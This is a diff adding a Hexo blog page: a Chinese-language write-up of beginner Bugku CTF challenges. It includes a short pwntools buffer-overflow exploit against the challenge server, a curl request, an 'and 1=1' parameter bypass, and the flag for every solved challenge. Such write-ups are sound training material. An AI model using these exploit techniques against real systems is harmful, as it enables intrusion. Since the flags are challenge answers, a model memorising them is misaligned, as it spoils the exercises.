@@ -1,0 +1,1108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Tr0y2ooo">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2024/12/25/bugku/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="tags: write upBugku CTF Write upPWNpwn1說明:netcat先連過去，然後ls看看當前目錄有甚麼，會發現有flag這個檔案，直接$cat flag打開就是flag了 flag:flag{9e861196d5a73bcd} solve date : 2021&#x2F;01&#x2F;14 pwn2說明:先檢查有開那些防護然後ida拆開來發現有read，puts，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Bugku">
+<meta property="og:url" content="http://example.com/2024/12/25/Bugku/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="tags: write upBugku CTF Write upPWNpwn1說明:netcat先連過去，然後ls看看當前目錄有甚麼，會發現有flag這個檔案，直接$cat flag打開就是flag了 flag:flag{9e861196d5a73bcd} solve date : 2021&#x2F;01&#x2F;14 pwn2說明:先檢查有開那些防護然後ida拆開來發現有read，puts，">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.imgur.com/gyj1jpp.png">
+<meta property="og:image" content="https://i.imgur.com/6HkkezO.png">
+<meta property="og:image" content="https://i.imgur.com/XZLrYtI.png">
+<meta property="og:image" content="https://i.imgur.com/Tq7JnCP.png">
+<meta property="og:image" content="https://i.imgur.com/OP6qRHu.png">
+<meta property="og:image" content="https://i.imgur.com/he5HSCw.png">
+<meta property="og:image" content="https://i.imgur.com/kug37Lp.png">
+<meta property="og:image" content="https://i.imgur.com/K5YFCzH.png">
+<meta property="og:image" content="https://i.imgur.com/6i4YIVL.png">
+<meta property="og:image" content="https://i.imgur.com/VcHzA7Q.png">
+<meta property="og:image" content="https://i.imgur.com/inNOPuY.png">
+<meta property="og:image" content="https://i.imgur.com/7OjCHqD.png">
+<meta property="og:image" content="https://i.imgur.com/jngE9Md.png">
+<meta property="og:image" content="https://i.imgur.com/muKZwzO.png">
+<meta property="og:image" content="https://i.imgur.com/INKSvhJ.png">
+<meta property="og:image" content="https://i.imgur.com/IlQQusk.png">
+<meta property="og:image" content="https://i.imgur.com/5TNbCP0.png">
+<meta property="og:image" content="https://i.imgur.com/bJcnccr.png">
+<meta property="og:image" content="https://i.imgur.com/NIGV4pe.png">
+<meta property="og:image" content="https://i.imgur.com/Uwn0KzH.png">
+<meta property="article:published_time" content="2024-12-24T17:44:00.000Z">
+<meta property="article:modified_time" content="2024-12-24T17:44:51.723Z">
+<meta property="article:author" content="Troy">
+<meta property="article:tag" content="Bugku">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.imgur.com/gyj1jpp.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/null" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/null">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/null">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Bugku | Tr0y2ooo in the house
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/rem.jpg","dark":"/images/rem_dark.jpg"},"title":"‎‎‎‏‎‏‎‏","subtitle":{"text":null,"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":true,"type":"fixed","audios":[{"name":"幹你娘","artist":"DJ Jerry","url":"https://ssl-pixnet-tv.pixfs.net/user/leo4/1231657490.m4a","cover":"https://media.discordapp.net/attachments/850438898093785128/1262046151520161835/1720574532076.gif?ex=67340852&is=6732b6d2&hm=a84a4a8bdeae5d7d34f0a8a1ccc339a001a624eb6ff490d5fd18cb35e0a49b84&=","lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.7.3","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"tags":{"path":"/tags/","icon":"fa-solid fa-tags"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/EvanNotFound/hexo-theme-redefine","Blog":"https://ohevan.com"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3,"Tags":null,"icon":"fa-solid fa-tags","path":"/tags/"}},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container flex flex-col justify-between min-h-dvh">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Tr0y2ooo in the house
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/tags/"
+                                        >
+                                    <i class="fa-solid fa-tags fa-fw"></i>
+                                    TAGS
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown"
+                                   href="#"
+                                        onClick=&#34;return false;&#34;>
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    ABOUT
+                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                        
+                                            <li>
+                                                <a href="/about">
+                                                    ME
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a target="_blank" rel="noopener" href="https://github.com/EvanNotFound/hexo-theme-redefine">
+                                                    GITHUB
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a target="_blank" rel="noopener" href="https://ohevan.com">
+                                                    BLOG
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/tags/"
+                        >
+                            <span>
+                                TAGS
+                            </span>
+                            
+                                <i class="fa-solid fa-tags fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
+                        
+                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                             navbar-data-toggle="submenu-About"
+                        >
+                            <span>
+                                ABOUT
+                            </span>
+                            
+                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
+                            
+                        </div>
+                        
+
+                        
+                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-About">
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/about">ME</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           target="_blank" rel="noopener" href="https://github.com/EvanNotFound/hexo-theme-redefine">GITHUB</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           target="_blank" rel="noopener" href="https://ohevan.com">BLOG</a>
+                                    </div>
+                                
+                            </div>
+                        
+                    </li>
+            
+
+            
+            
+                
+                    
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/tags"
+                        >
+                            <span>Tags</span>
+                            <i class="fa-regular fa-tags fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/categories"
+                        >
+                            <span>Categories</span>
+                            <i class="fa-regular fa-folder fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">21</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">14</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">21</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">Bugku</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/personal.jpg">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Troy</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv3</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-12-25 01:44</span>
+        <span class="mobile">2024-12-25 01:44</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-12-25 01:44:51</span>
+            <span class="mobile">2024-12-25 01:44:51</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/ctf/">ctf</a>&nbsp;
+                        </li>
+                    
+                    
+                
+                    
+                        
+                            <li>></li>
+                        
+                        <li>
+                            <a href="/categories/ctf/write-up/">write up</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Bugku/">Bugku</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h6 id="tags-write-up"><a href="#tags-write-up" class="headerlink" title="tags: write up"></a>tags: <code>write up</code></h6><h1 id="Bugku-CTF-Write-up"><a href="#Bugku-CTF-Write-up" class="headerlink" title="Bugku CTF Write up"></a>Bugku CTF Write up</h1><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><p>說明:netcat先連過去，然後ls看看當前目錄有甚麼，會發現有flag這個檔案，直接$cat flag打開就是flag了</p>
+<p>flag:flag{9e861196d5a73bcd}</p>
+<p>solve date : 2021&#x2F;01&#x2F;14</p>
+<h3 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h3><p>說明:先檢查有開那些防護<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/gyj1jpp.png"
+                     
+                ><br>然後ida拆開來發現有read，puts，setvbuf大概猜到是bof(bufferoverflow)了!<br>bof就是輸入超過buffer可以存取的字元，回傳非預期的函式等等。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/6HkkezO.png"
+                     
+                ></p>
+<p>可以發現get_shell_這個函式，內容如下:</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/XZLrYtI.png"
+                     
+                ></p>
+<p>總之就是印出flag，所以我要Return這個function。<br>把main函式反編成pseudocode(偽代碼-類似C語言的程式語言)(按F5)，可以看到:</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/Tq7JnCP.png"
+                     
+                ><br>會發現buffer大小是<code>0x30</code>，然後read()<code>0x100</code>讀入0x100的東西，所以可以確定是bof沒錯了。</p>
+<p>先用gdb看看，斷點設在read()，跑起來 &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;—————(30%)Loading…<br>n到輸入的地方<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/OP6qRHu.png"
+                     
+                ><br>輸入0x30(48)個字元(這邊是用A)，檢查Register會發現RBP和RSP差了0x30<br>因此我們只要填充’A’*48(0x30)個就能填滿RBP了<br>RBP後的8byte是Return address，所以要再加0x8個’A’;<br>最後加到”get_shell_”的address<br>payload &gt;&gt;</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">r = remote(<span class="string">&quot;114.67.246.176&quot;</span>,<span class="number">16015</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;say something?&#x27;</span>)</span><br><span class="line">adr = <span class="number">0x0000000000400751</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">56</span> + p64(adr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
+
+
+<p>result:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/he5HSCw.png"
+                     
+                ></p>
+<p>flag:flag{99kls08s6d5a73bcd}</p>
+<p>solve date:2021&#x2F;1&#x2F;15</p>
+<h3 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h3><p>說明:這題貌似還沒出完，nc過去會問你要看哪個note，打flag就噴flag了@@<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/kug37Lp.png"
+                     
+                ></p>
+<p>flag:flag{99i92o08s6d5a73bcd}</p>
+<p>solve date:2021&#x2F;1&#x2F;15</p>
+<h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id=""><a href="#" class="headerlink" title="&#x2F;.-"></a>&#x2F;.-</h3><p>說明:摩斯密碼<br>decode完變這樣(flag—-.–d3fcbf17f9399504—–.-)<br>去掉’-和.’改成{}</p>
+<p>flag:flag{d3fcbf17f9399504}</p>
+<p>solve date : 2021&#x2F;01&#x2F;13</p>
+<h3 id="-1"><a href="#-1" class="headerlink" title="[+ -&lt;&gt;]"></a>[+ -&lt;&gt;]</h3><p>說明brainfuck decode，用線上工具即可。</p>
+<p>flag:flag{0d86208ac54fbf12}</p>
+<p>solve data : 2021&#x2F;1&#x2F;16</p>
+<h3 id="聪明的小羊"><a href="#聪明的小羊" class="headerlink" title="聪明的小羊"></a>聪明的小羊</h3><p>說明:栅栏密码解密，線上工具解決。</p>
+<p>flag:flag{6fde4163df05d900}</p>
+<p>solve date : 2021&#x2F;1&#x2F;16</p>
+<h3 id="ok"><a href="#ok" class="headerlink" title="ok"></a>ok</h3><p>說明:ook decode。</p>
+<p>flag:flag{0a394df55312c51a}</p>
+<p>solve date : 2021&#x2F;1&#x2F;16</p>
+<h3 id="easy-crypto"><a href="#easy-crypto" class="headerlink" title="easy_crypto"></a>easy_crypto</h3><p>說明:<a class="link"   target="_blank" rel="noopener" href="http://ctf.ssleye.com/morse.html" >摩斯密碼 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
+<p>flag:flag{m0rse_code_1s_interest1n9!}</p>
+<p>solve date : 2021&#x2F;1&#x2F;16</p>
+<h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="入门逆向"><a href="#入门逆向" class="headerlink" title="入门逆向"></a>入门逆向</h3><p>說明:下載檔案，是一個zip壓縮檔，解壓縮完會看到一個’baby.exe’，打開是無法執行的，因此我用ida透視看看，在main fuc裡面可以找到flag。<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/K5YFCzH.png"
+                     
+                ><br>flag:flag{Re_1s_S0_c0Ol}</p>
+<p>solve date : 2021&#x2F;01&#x2F;13</p>
+<h3 id="-2"><a href="#-2" class="headerlink" title=""></a></h3><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="簽到題"><a href="#簽到題" class="headerlink" title="簽到題"></a>簽到題</h3><p>說明：加入公眾號<br>flag : flag{BugKu-Sec-pwn!}</p>
+<p>solve date : 2021&#x2F;01&#x2F;13</p>
+<h3 id="这是一张单纯的图片"><a href="#这是一张单纯的图片" class="headerlink" title="这是一张单纯的图片"></a>这是一张单纯的图片</h3><p>說明:靜態分析，然後找到key<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/6i4YIVL.png"
+                     
+                ></p>
+<p>flag：flag{}</p>
+<p>solve date：2021&#x2F;01&#x2F;13</p>
+<h3 id="猜"><a href="#猜" class="headerlink" title="猜"></a>猜</h3><p>說明:google圖片搜索，肉搜。<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/VcHzA7Q.png"
+                     
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/inNOPuY.png"
+                     
+                ><br>會找到”劉亦菲”<br>改成拼音全小寫的format</p>
+<p>flag:key{liuyifei}</p>
+<p>solve date：2021&#x2F;01&#x2F;14</p>
+<h3 id="眼见非实"><a href="#眼见非实" class="headerlink" title="眼见非实"></a>眼见非实</h3><p>說明:一開始是.zip檔，解壓縮完變成docx，發現打不開後，把檔名改成.zip再解壓縮就噴出一堆檔案了，在裡面找flag。<br>再document.xml裡面。</p>
+<p>flag:flag{fl@g}</p>
+<p>solve date : 2021&#x2F;01&#x2F;16</p>
+<h3 id="talent"><a href="#talent" class="headerlink" title="talent"></a>talent</h3><p>說明:看到檔名是.pcap，應該是要用wireshark去解析，不過先用靜態分析flag就噴出來了@@。<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/7OjCHqD.png"
+                     
+                ><br>用TCP stream就能追蹤到flag了</p>
+<p>flag:flag{d316759c281bf925d600be698a4973d5}</p>
+<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><p>說明:flag在開發者模式可以看到，按f12<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/jngE9Md.png"
+                     
+                ><br>flag：flag{07bed1d244d8e7ae0850314f1d749202}</p>
+<p>solve date : 2021&#x2F;01&#x2F;13</p>
+<h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>說明:一開始要輸入答案時，發現只能輸入一個數字，打開開法者模式發現輸入框的maxlenth只有1，改成2即可。<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/muKZwzO.png"
+                     
+                ></p>
+<p>flag:flag{1e307905db3cbebad58bf2c7e34faddb}</p>
+<p>solve date : 2021&#x2F;01&#x2F;13</p>
+<h3 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h3><p>說明:可以看到src主要是在說有一個參數”what”method是GET，當它等於”flag”的時候印出flag。<br>由於是GET請求，因此在網址後方加上”?what&#x3D;flag”答案就出來了。<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/INKSvhJ.png"
+                     
+                ></p>
+<p>flag:flag{b7346588b166e671346b9b001ee34a57}</p>
+<p>solve date : 2021&#x2F;01&#x2F;13</p>
+<h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/IlQQusk.png"
+                     
+                ><br>可以發現跟上一題幾乎一模一樣，只是參數”what”的方法改成POST，因此我使用curl。<br>cmd$ curl -d “what&#x3D;flag” “<a class="link"   target="_blank" rel="noopener" href="http://114.67.246.176:14632/" >http://114.67.246.176:14632/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>“</p>
+<p>flag{09534b64afc3f6ef7b785fca0c6bab62}</p>
+<p>solve date : 2021&#x2F;01&#x2F;13</p>
+<h3 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h3><p>說明:題目的意思是先判斷num是不是數字，然後再看他是不是等於1;<br>這邊有兩種做法，一種是在num&#x3D;1後面加上任意字母或是符號，例如(?num&#x3D;1.)(?num&#x3D;1a)…等等。<br>第二種做法是直接在num&#x3D;1後面加and 1&#x3D;1直接通過判斷。(?num&#x3D;1 and 1&#x3D;1)<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/5TNbCP0.png"
+                     
+                ></p>
+<p>flag:flag{24ef882c0eac9d7d4b1d56075a01c0e0}</p>
+<p>solve date : 2021&#x2F;01&#x2F;13</p>
+<h3 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h3><p>說明:页面一直跳出對話方塊，所以我先打開源代碼(ctrl+u)，接著會發現下面有一行貌似flag的編碼，查了一下發現是html編碼，用線上工具decode flag就出來了。<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/bJcnccr.png"
+                     
+                ></p>
+<p>flag:flag{9265f6135017715dfc3219555131dc07}</p>
+<p>solve date : 2021&#x2F;01&#x2F;13</p>
+<h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><p>說明:這題會一直跳圖片，正解應該是去截取封包，然後分析，不過我打開源代碼就看到flag了@@。</p>
+<p>flag:flag{0c9cf6b13cc810b50c228337390a2676}</p>
+<p>solve date : 2021&#x2F;01&#x2F;13</p>
